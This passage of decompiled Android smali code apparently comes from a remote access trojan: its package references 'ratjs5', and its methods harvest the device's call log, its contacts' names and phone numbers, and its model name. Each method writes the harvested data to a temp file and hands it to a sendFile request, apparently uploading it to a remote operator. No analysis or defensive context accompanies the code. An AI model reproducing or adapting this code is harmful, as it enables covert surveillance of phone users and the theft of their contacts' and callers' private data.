    sget-object v4, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v4}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$2$str$arg-0$call-createTempFile$val-file$fun-sendApps$class-AppActions()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    sget-object v4, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v4}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$arg-1$call-createTempFile$val-file$fun-sendApps$class-AppActions()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;)Ljava/io/File;

    move-result-object v3

    .line 133
    .local v3, "file":Ljava/io/File;
    new-instance v4, Ljava/io/FileWriter;

    invoke-direct {v4, v3}, Ljava/io/FileWriter;-><init>(Ljava/io/File;)V

    .line 134
    .local v4, "writer":Ljava/io/FileWriter;
    move-object v5, v0

    check-cast v5, Ljava/lang/CharSequence;

    invoke-virtual {v4, v5}, Ljava/io/FileWriter;->append(Ljava/lang/CharSequence;)Ljava/io/Writer;

    .line 135
    invoke-virtual {v4}, Ljava/io/FileWriter;->flush()V

    .line 136
    invoke-virtual {v4}, Ljava/io/FileWriter;->close()V

    .line 137
    iget-object v5, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->request:Lthisisme/thisapp/inspector/Utils/AppRequest;

    const-string v6, "file"

    invoke-static {v3, v6}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v5, v3}, Lthisisme/thisapp/inspector/Utils/AppRequest;->sendFile(Ljava/io/File;)V

    .line 138
    return-void
.end method

.method public final sendCallLog()V
    .locals 15

    .line 61
    iget-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->permission:Lthisisme/thisapp/inspector/Utils/AppPermission;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/AppPermission;->checkReadCallLog()Z

    move-result v0

    if-eqz v0, :cond_3

    .line 62
    const-string v0, "number"

    .line 63
    .local v0, "numberCol":Ljava/lang/String;
    const-string v1, "duration"

    .line 64
    .local v1, "durationCol":Ljava/lang/String;
    const-string v2, "type"

    .line 65
    .local v2, "typeCol":Ljava/lang/String;
    const/4 v3, 0x3

    new-array v6, v3, [Ljava/lang/String;

    const/4 v3, 0x0

    aput-object v0, v6, v3

    const/4 v3, 0x1

    aput-object v1, v6, v3

    const/4 v3, 0x2

    aput-object v2, v6, v3

    .line 66
    .local v6, "projection":[Ljava/lang/String;
    iget-object v3, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->context:Landroid/content/Context;

    invoke-virtual {v3}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v4

    .line 67
    sget-object v5, Landroid/provider/CallLog$Calls;->CONTENT_URI:Landroid/net/Uri;

    .line 68
    const/4 v7, 0x0

    const/4 v8, 0x0

    const/4 v9, 0x0

    .line 66
    invoke-virtual/range {v4 .. v9}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v3

    .line 70
    .local v3, "cursor":Landroid/database/Cursor;
    invoke-static {v3}, Lkotlin/jvm/internal/Intrinsics;->checkNotNull(Ljava/lang/Object;)V

    invoke-interface {v3, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    .line 71
    .local v4, "numberColIdx":I
    invoke-interface {v3, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    .line 72
    .local v5, "durationColIdx":I
    invoke-interface {v3, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v7

    .line 73
    .local v7, "typeColIdx":I
    sget-object v8, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v8}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$val-text$branch$if$fun-sendCallLog$class-AppActions()Ljava/lang/String;

    move-result-object v8

    .line 74
    .local v8, "text":Ljava/lang/String;
    :goto_0
    invoke-interface {v3}, Landroid/database/Cursor;->moveToNext()Z

    move-result v9

    if-eqz v9, :cond_2

    .line 75
    invoke-interface {v3, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v9

    .line 76
    .local v9, "number":Ljava/lang/String;
    invoke-interface {v3, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v10

    .line 77
    .local v10, "duration":Ljava/lang/String;
    invoke-interface {v3, v7}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v11

    .line 79
    .local v11, "type":Ljava/lang/String;
    sget-object v12, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v12}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$arg-1$call-EQEQ$cond$if$val-typeCorrect$body$loop$branch$if$fun-sendCallLog$class-AppActions()Ljava/lang/String;

    move-result-object v12

    invoke-static {v11, v12}, Lkotlin/jvm/internal/Intrinsics;->areEqual(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    sget-object v12, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v12}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$branch$if$val-typeCorrect$body$loop$branch$if$fun-sendCallLog$class-AppActions()Ljava/lang/String;

    move-result-object v12

    goto :goto_1

    :cond_0
    sget-object v12, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v12}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$arg-1$call-EQEQ$cond-1$if$val-typeCorrect$body$loop$branch$if$fun-sendCallLog$class-AppActions()Ljava/lang/String;

    move-result-object v12

    invoke-static {v11, v12}, Lkotlin/jvm/internal/Intrinsics;->areEqual(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_1

    sget-object v12, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v12}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$branch-1$if$val-typeCorrect$body$loop$branch$if$fun-sendCallLog$class-AppActions()Ljava/lang/String;

    move-result-object v12

    goto :goto_1

    :cond_1
    sget-object v12, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v12}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$else$if$val-typeCorrect$body$loop$branch$if$fun-sendCallLog$class-AppActions()Ljava/lang/String;

    move-result-object v12

    .line 78
    :goto_1
    nop

    .line 80
    .local v12, "typeCorrect":Ljava/lang/String;
    new-instance v13, Ljava/lang/StringBuilder;

    invoke-direct {v13}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v13, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v14, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v14}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$0$str$arg-0$call-plus$set-text$body$loop$branch$if$fun-sendCallLog$class-AppActions()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    sget-object v14, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v14}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$2$str$arg-0$call-plus$set-text$body$loop$branch$if$fun-sendCallLog$class-AppActions()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    sget-object v14, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v14}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$4$str$arg-0$call-plus$set-text$body$loop$branch$if$fun-sendCallLog$class-AppActions()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v14, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v14}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$6$str$arg-0$call-plus$set-text$body$loop$branch$if$fun-sendCallLog$class-AppActions()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .end local v9    # "number":Ljava/lang/String;
    .end local v10    # "duration":Ljava/lang/String;
    .end local v11    # "type":Ljava/lang/String;
    .end local v12    # "typeCorrect":Ljava/lang/String;
    goto :goto_0

    .line 82
    :cond_2
    invoke-interface {v3}, Landroid/database/Cursor;->close()V

    .line 83
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v10, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v10}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$0$str$arg-0$call-createTempFile$val-file$branch$if$fun-sendCallLog$class-AppActions()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v10, Lcom/myapps/ratjs5/Tools/AppTools;->Companion:Lcom/myapps/ratjs5/Tools/AppTools$Companion;

    invoke-virtual {v10}, Lcom/myapps/ratjs5/Tools/AppTools$Companion;->getDeviceName()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v10, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v10}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$2$str$arg-0$call-createTempFile$val-file$branch$if$fun-sendCallLog$class-AppActions()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    sget-object v10, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v10}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$arg-1$call-createTempFile$val-file$branch$if$fun-sendCallLog$class-AppActions()Ljava/lang/String;

    move-result-object v10

    invoke-static {v9, v10}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;)Ljava/io/File;

    move-result-object v9

    .line 84
    .local v9, "file":Ljava/io/File;
    new-instance v10, Ljava/io/FileWriter;

    invoke-direct {v10, v9}, Ljava/io/FileWriter;-><init>(Ljava/io/File;)V

    .line 85
    .local v10, "writer":Ljava/io/FileWriter;
    move-object v11, v8

    check-cast v11, Ljava/lang/CharSequence;

    invoke-virtual {v10, v11}, Ljava/io/FileWriter;->append(Ljava/lang/CharSequence;)Ljava/io/Writer;

    .line 86
    invoke-virtual {v10}, Ljava/io/FileWriter;->flush()V

    .line 87
    invoke-virtual {v10}, Ljava/io/FileWriter;->close()V

    .line 88
    iget-object v11, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->request:Lthisisme/thisapp/inspector/Utils/AppRequest;

    const-string v12, "file"

    invoke-static {v9, v12}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v11, v9}, Lthisisme/thisapp/inspector/Utils/AppRequest;->sendFile(Ljava/io/File;)V

    .line 90
    .end local v0    # "numberCol":Ljava/lang/String;
    .end local v1    # "durationCol":Ljava/lang/String;
    .end local v2    # "typeCol":Ljava/lang/String;
    .end local v3    # "cursor":Landroid/database/Cursor;
    .end local v4    # "numberColIdx":I
    .end local v5    # "durationColIdx":I
    .end local v6    # "projection":[Ljava/lang/String;
    .end local v7    # "typeColIdx":I
    .end local v8    # "text":Ljava/lang/String;
    .end local v9    # "file":Ljava/io/File;
    .end local v10    # "writer":Ljava/io/FileWriter;
    :cond_3
    return-void
.end method

.method public final sendContact()V
    .locals 13

    .line 153
    iget-object v0, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->permission:Lthisisme/thisapp/inspector/Utils/AppPermission;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/AppPermission;->checkReadContacts()Z

    move-result v0

    if-eqz v0, :cond_6

    .line 154
    sget-object v0, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v0}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$val-allContactList$branch$if$fun-sendContact$class-AppActions()Ljava/lang/String;

    move-result-object v0

    .line 155
    .local v0, "allContactList":Ljava/lang/String;
    iget-object v1, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->context:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    const-string v1, "context.contentResolver"

    invoke-static {v2, v1}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    .line 156
    .local v2, "cr":Landroid/content/ContentResolver;
    nop

    .line 157
    sget-object v3, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;

    .line 158
    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    const/4 v7, 0x0

    .line 156
    invoke-virtual/range {v2 .. v7}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1

    .line 160
    .local v1, "cur":Landroid/database/Cursor;
    if-nez v1, :cond_0

    const/4 v3, 0x0

    goto :goto_0

    :cond_0
    invoke-interface {v1}, Landroid/database/Cursor;->getCount()I

    move-result v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    :goto_0
    if-nez v3, :cond_1

    sget-object v3, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v3}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->Int$branch$when$arg-0$call-greater$cond$if$branch$if$fun-sendContact$class-AppActions()I

    move-result v3

    goto :goto_1

    :cond_1
    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v3

    :goto_1
    sget-object v4, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v4}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->Int$arg-1$call-greater$cond$if$branch$if$fun-sendContact$class-AppActions()I

    move-result v4

    if-le v3, v4, :cond_4

    .line 161
    :cond_2
    :goto_2
    if-eqz v1, :cond_4

    invoke-interface {v1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v3

    if-eqz v3, :cond_4

    .line 162
    nop

    .line 163
    const-string v3, "_id"

    invoke-interface {v1, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    .line 162
    invoke-interface {v1, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    .line 165
    .local v3, "id":Ljava/lang/String;
    nop

    .line 166
    nop

    .line 167
    nop

    .line 166
    const-string v4, "display_name"

    invoke-interface {v1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    .line 165
    invoke-interface {v1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    .line 170
    .local v4, "name":Ljava/lang/String;
    nop

    .line 171
    nop

    .line 172
    nop

    .line 171
    const-string v5, "has_phone_number"

    invoke-interface {v1, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    .line 170
    invoke-interface {v1, v5}, Landroid/database/Cursor;->getInt(I)I

    move-result v5

    .line 174
    sget-object v6, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v6}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->Int$arg-1$call-greater$cond$if$body$loop$branch$if$branch$if$fun-sendContact$class-AppActions()I

    move-result v6

    if-le v5, v6, :cond_2

    .line 176
    nop

    .line 177
    sget-object v8, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    .line 178
    const/4 v9, 0x0

    .line 179
    sget-object v5, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v5}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$arg-0$call-plus$arg-2$call-query$val-pCur$branch$if$body$loop$branch$if$branch$if$fun-sendContact$class-AppActions()Ljava/lang/String;

    move-result-object v5

    const-string v6, "contact_id"

    invoke-static {v6, v5}, Lkotlin/jvm/internal/Intrinsics;->stringPlus(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    .line 180
    const/4 v5, 0x1

    new-array v11, v5, [Ljava/lang/String;

    const/4 v5, 0x0

    aput-object v3, v11, v5

    .line 181
    const/4 v12, 0x0

    .line 176
    move-object v7, v2

    invoke-virtual/range {v7 .. v12}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v5

    .line 183
    .local v5, "pCur":Landroid/database/Cursor;
    :goto_3
    invoke-static {v5}, Lkotlin/jvm/internal/Intrinsics;->checkNotNull(Ljava/lang/Object;)V

    invoke-interface {v5}, Landroid/database/Cursor;->moveToNext()Z

    move-result v6

    if-eqz v6, :cond_3

    .line 184
    nop

    .line 185
    nop

    .line 186
    nop

    .line 185
    const-string v6, "data1"

    invoke-interface {v5, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    .line 184
    invoke-interface {v5, v6}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    .line 189
    .local v6, "phoneNo":Ljava/lang/String;
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v8, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v8}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$0$str$arg-0$call-plus$set-allContactList$body$loop$branch$if$body$loop$branch$if$branch$if$fun-sendContact$class-AppActions()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    sget-object v8, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v8}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$2$str$arg-0$call-plus$set-allContactList$body$loop$branch$if$body$loop$branch$if$branch$if$fun-sendContact$class-AppActions()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    sget-object v8, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v8}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$4$str$arg-0$call-plus$set-allContactList$body$loop$branch$if$body$loop$branch$if$branch$if$fun-sendContact$class-AppActions()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .end local v6    # "phoneNo":Ljava/lang/String;
    goto :goto_3

    .line 191
    :cond_3
    invoke-interface {v5}, Landroid/database/Cursor;->close()V

    .end local v3    # "id":Ljava/lang/String;
    .end local v4    # "name":Ljava/lang/String;
    .end local v5    # "pCur":Landroid/database/Cursor;
    goto/16 :goto_2

    .line 195
    :cond_4
    if-nez v1, :cond_5

    goto :goto_4

    :cond_5
    invoke-interface {v1}, Landroid/database/Cursor;->close()V

    .line 197
    :goto_4
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v4, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v4}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$0$str$arg-0$call-createTempFile$val-file$branch$if$fun-sendContact$class-AppActions()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v4, Lcom/myapps/ratjs5/Tools/AppTools;->Companion:Lcom/myapps/ratjs5/Tools/AppTools$Companion;

    invoke-virtual {v4}, Lcom/myapps/ratjs5/Tools/AppTools$Companion;->getDeviceName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v4, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v4}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$2$str$arg-0$call-createTempFile$val-file$branch$if$fun-sendContact$class-AppActions()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    sget-object v4, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v4}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$arg-1$call-createTempFile$val-file$branch$if$fun-sendContact$class-AppActions()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;)Ljava/io/File;

    move-result-object v3

    .line 196
    nop

    .line 198
    .local v3, "file":Ljava/io/File;
    new-instance v4, Ljava/io/FileWriter;

    invoke-direct {v4, v3}, Ljava/io/FileWriter;-><init>(Ljava/io/File;)V

    .line 199
    .local v4, "writer":Ljava/io/FileWriter;
    move-object v5, v0

    check-cast v5, Ljava/lang/CharSequence;

    invoke-virtual {v4, v5}, Ljava/io/FileWriter;->append(Ljava/lang/CharSequence;)Ljava/io/Writer;

    .line 200
    invoke-virtual {v4}, Ljava/io/FileWriter;->flush()V

    .line 201
    invoke-virtual {v4}, Ljava/io/FileWriter;->close()V

    .line 202
    iget-object v5, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->request:Lthisisme/thisapp/inspector/Utils/AppRequest;

    const-string v6, "file"

    invoke-static {v3, v6}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v5, v3}, Lthisisme/thisapp/inspector/Utils/AppRequest;->sendFile(Ljava/io/File;)V

    .line 204
    .end local v0    # "allContactList":Ljava/lang/String;
    .end local v1    # "cur":Landroid/database/Cursor;
    .end local v2    # "cr":Landroid/content/ContentResolver;
    .end local v3    # "file":Ljava/io/File;
    .end local v4    # "writer":Ljava/io/FileWriter;
    :cond_6
    return-void
.end method

.method public final sendDeviceName()V
    .locals 6

    .line 141
    sget-object v0, Lcom/myapps/ratjs5/Tools/AppTools;->Companion:Lcom/myapps/ratjs5/Tools/AppTools$Companion;

    invoke-virtual {v0}, Lcom/myapps/ratjs5/Tools/AppTools$Companion;->getDeviceName()Ljava/lang/String;

    move-result-object v0

    .line 142
    .local v0, "model":Ljava/lang/String;
    sget-object v1, Lcom/myapps/ratjs5/Tools/AppTools;->Companion:Lcom/myapps/ratjs5/Tools/AppTools$Companion;

    iget-object v2, p0, Lthisisme/thisapp/inspector/Utils/AppActions;->context:Landroid/content/Context;

    invoke-virtual {v1, v2}, Lcom/myapps/ratjs5/Tools/AppTools$Companion;->getBatteryPercentage(Landroid/content/Context;)I

    move-result v1

    .line 143
    .local v1, "battery":I
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v3}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$0$str$arg-0$call-createTempFile$val-file$fun-sendDeviceName$class-AppActions()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v3, Lcom/myapps/ratjs5/Tools/AppTools;->Companion:Lcom/myapps/ratjs5/Tools/AppTools$Companion;

    invoke-virtual {v3}, Lcom/myapps/ratjs5/Tools/AppTools$Companion;->getDeviceName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v3, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->INSTANCE:Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;

    invoke-virtual {v3}, Lthisisme/thisapp/inspector/Utils/LiveLiterals$AppActionsKt;->String$2$str$arg-0$call-createTempFile$val-file$fun-sendDeviceName$class-AppActions()Ljava/lang/String;

    move-result-object v3

